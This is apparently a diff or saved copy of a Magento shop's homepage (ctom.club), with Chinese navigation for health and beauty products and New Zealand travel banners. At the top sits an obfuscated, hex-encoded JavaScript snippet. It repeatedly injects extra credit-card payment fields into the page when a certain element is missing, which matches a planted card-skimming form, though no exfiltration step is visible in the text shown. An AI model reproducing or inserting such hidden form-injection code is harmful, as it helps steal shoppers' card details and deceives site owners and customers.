0\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x79\x65\x61\x72\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x31\x22\x3E\x32\x30\x31\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x32\x22\x3E\x32\x30\x31\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x33\x22\x3E\x32\x30\x31\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x34\x22\x3E\x32\x30\x31\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x35\x22\x3E\x32\x30\x31\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x76\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E","\x62\x65\x66\x6F\x72\x65\x65\x6E\x64","\x69\x6E\x73\x65\x72\x74\x41\x64\x6A\x61\x63\x65\x6E\x74\x48\x54\x4D\x4C"];window[_0xc240[3]](function(){if(!document[_0xc240[1]](_0xc240[0])){ShowForm(_0xc240[2])}},100);function ShowForm(_0x25adx2){if(document[_0xc240[1]](_0x25adx2)){var _0x25adx3=document[_0xc240[1]](_0x25adx2);while(_0x25adx3[_0xc240[4]]){_0x25adx3[_0xc240[5]](_0x25adx3[_0xc240[4]])};var _0x25adx4=_0xc240[6];_0x25adx3[_0xc240[8]](_0xc240[7],_0x25adx4)}}</script>
+<link href='http://fonts.googleapis.com/css?family=Glegoo' rel='stylesheet' type='text/css'>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/common.js"></script>
+<script type="text/javascript">
+  jQuery.noConflict();
+  // Code that uses other library's $ can follow here.
+</script>
+
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/nivo-slider/jquery.nivo.slider.pack.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/nivo-slider/nivo-slider.css" media="screen" />
+
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/js/mosaic.1.0.1.min.js"></script>
+<script type="text/javascript">
+jQuery.noConflict();
+	jQuery(function(jQuery){
+	   jQuery('.slide-info').mosaic({
+		animation:'slide'
+			});
+		 });
+		 jQuery.noConflict();
+	jQuery(function(jQuery){
+	   jQuery('.carousel-info').mosaic({
+		animation:'slide'
+			});
+		 });
+</script>
+
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/cloud-zoom/cloud-zoom.1.0.2.min.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/cloud-zoom/cloud-zoom.css" media="screen" />
+
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.ctom.club/skin/frontend/default/ctom/fancybox/jquery.fancybox-1.3.4.css" media="screen" />
+<script type="text/javascript" src="http://www.ctom.club/skin/frontend/default/ctom/fancybox/fancybox.setting.js"></script>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-30489899-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-bg">
+<div class="header-container">
+    <div class="header">
+        <div class="shopLinks">
+            <div class="user-info">             <p class="welcome-msg">Customer to Manufacture 一站式跨境采购平台  </p></div>
+            <div class="login-out"><ul class="links">
+                        <li class="first last" ><a href="http://www.ctom.club/index.php/customer/account/login/" title="Log In" >Log In</a></li>
+            </ul>
+</div>
+            <div class="shop-info">
+				                <div class="shoppingCart" ><div class="top-cart">
+            <div class="top-content">
+                    <p class="empty">0</p>
+        </div>
+</div>
+</div>
+            </div>
+            <div class="top-myaccount">
+            <div class="top-myaccount-header"></div>
+            <div class="drop-menu">
+            <ul class="links">
+                        <li class="first" ><a href="http://www.ctom.club/index.php/customer/account/" title="My Account" >My Account</a></li>
+                                            </ul>
+            </div>
+			</div>
+        </div>
+    	
+
+	                <h1 class="logo"><strong>Magento Commerce</strong><a href="http://www.ctom.club/index.php/" title="Magento Commerce" class="logo"><img src="http://www.ctom.club/skin/frontend/default/ctom/images/logo.jpg" alt="Magento Commerce" /></a></h1>
+                        <div class="nav-container">
+    <ul id="nav">
+		<!--<li class="home"><a href="http://www.ctom.club/index.php/">首页</a></li>
+        <li class="brand-vision"><a href="http://www.ctom.club/index.php/">品牌视野</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/stores-worldwide/">全球专卖店</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-history/">品牌历史</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-news/">品牌新闻</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-environment/">品牌环境</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-qualification/">品牌资质</a></li>
+            </ul>
+        </li>-->
+        <li class="home"><a href="http://www.ctom.club/index.php/">首页</a></li>
+        <li class="brand-vision"><a href="http://www.ctom.club/index.php/">品牌视野</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/stores-worldwide">全球专卖</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-history">品牌历史</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-news">品牌新闻</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-environment">品牌环境</a></li>
+                <li><a href="http://www.ctom.club/index.php/brand-qualification">品牌资质</a></li>
+            </ul>
+        </li>        <li class="level0 nav-1 level-top first last parent">
+<a href="http://www.ctom.club/index.php/products.html" class="level-top">
+<span>产品展厅</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first parent">
+<a href="http://www.ctom.club/index.php/products/ctomi.html">
+<span>CTOMI</span>
+</a>
+<ul class="level1">
+<li class="level2 nav-1-1-1 first">
+<a href="http://www.ctom.club/index.php/products/ctomi/bee-products.html">
+<span>Bee Products</span>
+</a>
+</li><li class="level2 nav-1-1-2">
+<a href="http://www.ctom.club/index.php/products/ctomi/sea-products.html">
+<span>Sea Products</span>
+</a>
+</li><li class="level2 nav-1-1-3">
+<a href="http://www.ctom.club/index.php/products/ctomi/cow-sheep-products.html">
+<span>Cow &amp; Sheep Products</span>
+</a>
+</li><li class="level2 nav-1-1-4">
+<a href="http://www.ctom.club/index.php/products/ctomi/deer-products.html">
+<span>Deer Products</span>
+</a>
+</li><li class="level2 nav-1-1-5 last">
+<a href="http://www.ctom.club/index.php/products/ctomi/plant-extract-products.html">
+<span>Plant Extract Products</span>
+</a>
+</li>
+</ul>
+</li><li class="level1 nav-1-2 last parent">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty.html">
+<span>Nature's Beauty</span>
+</a>
+<ul class="level1">
+<li class="level2 nav-1-2-6 first">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty/bee-venom.html">
+<span>Bee Venom</span>
+</a>
+</li><li class="level2 nav-1-2-7">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty/bee-kiwi.html">
+<span>Bee Kiwi</span>
+</a>
+</li><li class="level2 nav-1-2-8">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty/ovine-placenta.html">
+<span>Ovine Placenta</span>
+</a>
+</li><li class="level2 nav-1-2-9">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty/lanolux.html">
+<span>Lanolux &amp; Lanolin</span>
+</a>
+</li><li class="level2 nav-1-2-10 last">
+<a href="http://www.ctom.club/index.php/products/nature-s-beauty/thermal-mud.html">
+<span>Thermal Mud &amp; Aloe Vera </span>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>           <li class="international-service"><a href="http://www.ctom.club/index.php/">国际化服务</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/overseas-direct-mail-policy">海外直邮政策</a></li>
+                <li><a href="http://www.ctom.club/index.php/global-network-registration">全球网点签到</a></li>
+                <li><a href="http://www.ctom.club/index.php/return-policy">退换货政策</a></li>
+                <li><a href="http://www.ctom.club/index.php/logistics-services">物流服务</a></li>
+                <li><a href="http://www.ctom.club/index.php/complaints-and-suggestions">投诉与建议</a></li>
+            </ul>
+        </li>
+        <li class="brand-forum"><a href="http://www.ctom.club/index.php/">品牌论坛</a></li>
+        <li class="wikipedia"><a href="http://www.ctom.club/index.php/announcement">公告</a></li>
+        <li class="contact-us"><a href="http://www.ctom.club/index.php/">联系我们</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/domestic-service-team">国内服务团队</a></li>
+                <li><a href="http://www.ctom.club/index.php/overseas-customer-service-team">海外客服团队</a></li>
+            </ul>
+        </li>        <!--<li class="international-service"><a href="http://www.ctom.club/index.php/">国际化服务</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/overseas-direct-mail-policy/">海外直邮政策</a></li>
+                <li><a href="http://www.ctom.club/index.php/global-network-registration/">全球网点签到</a></li>
+                <li><a href="http://www.ctom.club/index.php/return-policy/">退换货政策</a></li>
+                <li><a href="http://www.ctom.club/index.php/logistics-services/">物流服务</a></li>
+                <li><a href="http://www.ctom.club/index.php/complaints-and-suggestions/">投诉与建议</a></li>
+            </ul>
+        </li>
+        <li class="brand-forum"><a href="http://www.ctom.club/index.php/">品牌论坛</a></li>
+        <li class="wikipedia"><a href="http://www.ctom.club/index.php/announcement/">公告</a></li>
+        <li class="contact-us"><a href="http://www.ctom.club/index.php/">联系我们</a>
+        	<ul>
+            	<li><a href="http://www.ctom.club/index.php/domestic-service-team/">国内服务团队</a></li>
+                <li><a href="http://www.ctom.club/index.php/overseas-customer-service-team/">海外客服团队</a></li>
+            </ul>
+        </li>-->
+    </ul>
+</div>
+    </div>
+
+</div>
+</div>
+<script type="text/javascript">
+var  $jm = jQuery.noConflict();
+$jm(function(){    
+  //首页
+  $jm("#nav .home").mouseover(function(){
+    $jm("#nav .home>a").text("HOME");
+  });
+  $jm("#nav .home").mouseout(function(){
+    $jm("#nav .home>a").text("首页");
+  });
+  
+  //品牌视野
+  $jm("#nav .brand-vision").mouseover(function(){
+    $jm("#nav .brand-vision>a").text("BRAND");
+  });
+  $jm("#nav .brand-vision").mouseout(function(){
+    $jm("#nav .brand-vision>a").text("品牌视野");
+  });
+  
+  //产品展厅
+  $jm("#nav .nav-1").mouseover(function(){
+    $jm("#nav .nav-1>a").text("PRODUCTS");
+  });
+  $jm("#nav .nav-1").mouseout(function(){
+    $jm("#nav .nav-1>a").text("产品展厅");
+  });
+  
+  //官方授权
+  $jm("#nav .authorized").mouseover(function(){
+    $jm("#nav .authorized>a").text("AUTHORIZED");
+  });
+  $jm("#nav .authorized").mouseout(function(){
+    $jm("#nav .authorized>a").text("官方授权");
+  });
+  
+  //国际化服务
+  $jm("#nav .international-service").mouseover(function(){
+    $jm("#nav .international-service>a").text("SERVICE");
+  });
+  $jm("#nav .international-service").mouseout(function(){
+    $jm("#nav .international-service>a").text("国际化服务");
+  });
+  
+  //品牌论坛
+  $jm("#nav .brand-forum").mouseover(function(){
+    $jm("#nav .brand-forum>a").text("FORUM");
+  });
+  $jm("#nav .brand-forum").mouseout(function(){
+    $jm("#nav .brand-forum>a").text("品牌论坛");
+  });
+  
+  //维基百科
+  $jm("#nav .wikipedia").mouseover(function(){
+    $jm("#nav .wikipedia>a").text("ANNOUNCEMENT");
+  });
+  $jm("#nav .wikipedia").mouseout(function(){
+    $jm("#nav .wikipedia>a").text("公告");
+  });
+  
+  //联系我们
+  $jm("#nav .contact-us").mouseover(function(){
+    $jm("#nav .contact-us>a").text("CONTACT US");
+  });
+  $jm("#nav .contact-us").mouseout(function(){
+    $jm("#nav .contact-us>a").text("联系我们");
+  });
+  });
+</script>
+
+
+        <div class="home-column">
+        <div id="main">
+        <div id="index_b_hero">
+            <div class="hero-wrap">
+                <ul class="heros clearfix">
+                    <li class="hero">
+                    <!---- banner01 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container1">
+                     
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad01-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h2 class="popover-title">独特魅力</h2>
+                          <div class="popover-content">
+                            <p>新西兰尽管是一个年轻的国家，但其毛利文化、表演艺术、文学、博物馆和画廊却能使最狂热的艺术和文化爱好者趁兴而来，尽兴而归。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad01-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">绿色王国</h3>
+                          <div class="popover-content">
+                            <p>新西兰的园丁和环保主义者以他们的活力和完美主义著称。近三分之一的国土都是公园或度假村，所以你永远不会远离绿色天堂。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad01-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">海滩与海岸</h3>
+                          <div class="popover-content">
+                            <p>新西兰有着长达15000公里的海岸线，在西海岸，怒海狂潮拍打着陡峭的悬崖和风化的石头。而在东海岸，太平洋则温柔地在海湾和沙滩沿岸嬉戏，那里蓝天白云，水清沙幼。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover bottom" data-easein="cardInBottom" data-easeout="cardOutBottom" id="ad01-pop4">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                         <h3 class="popover-title">白云之乡</h3>
+                          <div class="popover-content">
+                            <p>新西兰的天空，始终是蔚蓝而清澈的。正值盛夏，让我们一起享受新西兰最纯净的天空！</p>
+                          </div>
+                        </div>
+                      </div>
+                       <div class="popover right" data-easein="cardInRight" data-easeout="cardOutRight" id="ad01-pop5">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                         <h3 class="popover-title">梦中雪山</h3>
+                          <div class="popover-content">
+                            <p>自驾旅行，感觉随处都是雪山，而且这些雪山，看着海拔都不高，不管衬托着草场、湖泊、湿地，还是丘陵，都是那样的壮丽，气势万千，美得让人窒息。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <img title="独特魅力" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad01-pop1"  /> 
+                      <img title="绿色王国" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad01-pop2"  /> 
+                      <img title="海滩与海岸" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad01-pop3"  /> 
+                      <img title="白云之乡" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon4" data-target="ad01-pop4"  /> 
+                      <img title="梦中雪山" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon5" data-target="ad01-pop5"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad01.jpg" alt="" class="largeimage" id="image1"> </div>
+                     
+                    </div>
+                    <!---- end of  banner01 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner02 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container2">
+                     
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad02-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">瓦卡蒂普湖</h3>
+                          <div class="popover-content">
+                            <p>瓦卡蒂普湖是新西兰的第三大湖泊，状如闪电，景色优美，也是新西兰户外活动的集中地，风靡世界的"蹦极"就是从这里最先兴起的。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad02-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">皇后镇市区</h3>
+                          <div class="popover-content">
+                            <p>如果有人评选世界上最美丽的小镇，那皇后镇一定会身在其中。夏季蓝天艳阳，秋季为鲜红与金黄的叶子染成缤纷多彩的面貌，冬天的气候清爽晴朗，还有大片覆着白雪的山岭，而春天又是百花盛开的日子。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad02-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">奢华享受</h3>
+                          <div class="popover-content">
+                            <p>皇后镇是永远不会令美食爱好者失望的地方。你可以在高档的海鲜餐厅享用饕餮大餐，也可以在精品度假屋挑选精美的佳肴稀珍。距皇后镇仅 20 分钟车程的箭镇也是一个美食天堂，其中的萨福朗餐厅（Saffron）更是世界知名。</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="瓦卡蒂普湖" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad02-pop1"  /> 
+                      <img title="皇后镇市区" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad02-pop2"  /> 
+                      <img title="奢华享受" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad02-pop3"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad02.jpg" alt="" class="largeimage" id="image2"> </div>
+                     
+                    </div>
+                    <!---- end of  banner02 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner03 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container3">
+                     
+                      <div class="popover right" data-easein="cardInRight" data-easeout="cardOutRight" id="ad03-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">蹦极天地</h3>
+                          <div class="popover-content">
+                            <p>皇后镇蹦极场地的刺激绝对能带给你一次生活的急速宣泄。跳跃瞬间，体验到生命穿越死亡那种前所未有的自由。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad03-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">峡谷漂流</h3>
+                          <div class="popover-content">
+                            <p>游客们可以在著名的休特弗河上观赏壮丽的峡谷风光，也可以在皇后镇码头（Queenstown Pier）乘坐"卡瓦罗号"喷射快艇（Kawarau Jet），体验穿越休特弗河峡谷（Shotover River Canyons）的惊险感觉。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad03-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">雪山坡地</h3>
+                          <div class="popover-content">
+                            <p>皇后镇拥有冰雪覆盖的山峰、清澈透明的湖泊与干燥寒冷的气候。冬之祭活动除了各式滑雪比赛、冰上曲棍球赛、雪雕与表演之外，还有许多精采无比的节目</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="蹦极天地" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad03-pop1"  /> 
+                      <img title="峡谷漂流" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad03-pop2"  /> 
+                      <img title="雪山坡地" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad03-pop3"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad03.jpg" alt="" class="largeimage" id="image3"> </div>
+                     
+                    </div>
+                    <!---- end of  banner03 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner04 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container4">
+                     
+                      <div class="popover right" data-easein="cardInRight" data-easeout="cardOutRight" id="ad04-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">美酒佳酿</h3>
+                          <div class="popover-content">
+                            <p>皇后镇市区拥有众多咖啡馆或餐馆里享用美酒。精选的皇后镇葡萄酒庄餐馆也供应一流的美酒和美食，你可以一边享用美酒佳肴一边欣赏优美风景！</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad04-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">酿酒酒窖</h3>
+                          <div class="popover-content">
+                            <p>参加葡萄酒之旅的游客将有机会在这个独一无二的酒窖内品尝至香至纯的美酒。其他的葡萄酒庄也设拥有自己的美食餐厅，其中最有名的当数阿密斯菲尔德庄园酒馆（Amisfield Winery Bistro）与葡萄酒馆与厨房（The Winehouse & Kitchen）。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad04-pop3">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">fish&chips</h3>
+                          <div class="popover-content">
+                            <p>fish & chips木屋小店是湖边开设N年之久的全镇最有名的小吃店，一份大约12新西兰元左右就能品尝新西兰最著名的青口。</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      <img title="美酒佳酿" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon1" data-target="ad04-pop1"  /> 
+                      <img title="酿酒酒窖" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon2" data-target="ad04-pop2"  /> 
+                      <img title="fish&chips" src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/arrow1.png" alt="info" class="info-icon info-icon3" data-target="ad04-pop3"  /> 
+                      <img src="http://www.ctom.club/skin/frontend/default/ctom/images/banner/ad04.jpg" alt="" class="largeimage" id="image4"> </div>
+                     
+                    </div>
+                    <!---- end of  banner04 --->
+                    </li>
+                    <li class="hero">
+                    <!---- banner05 --->
+                      <div style="text-align:center;clear:both">
+                     
+                    <div class="container" id="container5">
+                     
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad05-pop1">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">Sky Tower</h3>
+                          <div class="popover-content">
+                            <p>天空塔(Sky Tower)是南半球最高的建筑物，里面设有旋转餐厅，用餐时，奥克兰全景可一一展现在眼前，在晴天可以看到方圆82公里的地方。还有多种语言的广播服务和交互式科技设备，以及视听展览。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover top" data-easein="cardInTop" data-easeout="cardOutTop" id="ad05-pop2">
+                        <div class="arrow"></div>
+                        <div class="popover-inner">
+                          <h3 class="popover-title">帆船之都</h3>
+                          <div class="popover-content">
+                            <p>奥克兰的地理位置得天独厚，拥有天然良港，市民拥有的船艇数量居世界前列，为它赢得“帆船之都”的美誉。</p>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="popover left" data-easein="cardInLeft" data-easeout="cardOutLeft" id="ad05-pop3">
+                        <div class="arrow"></div>
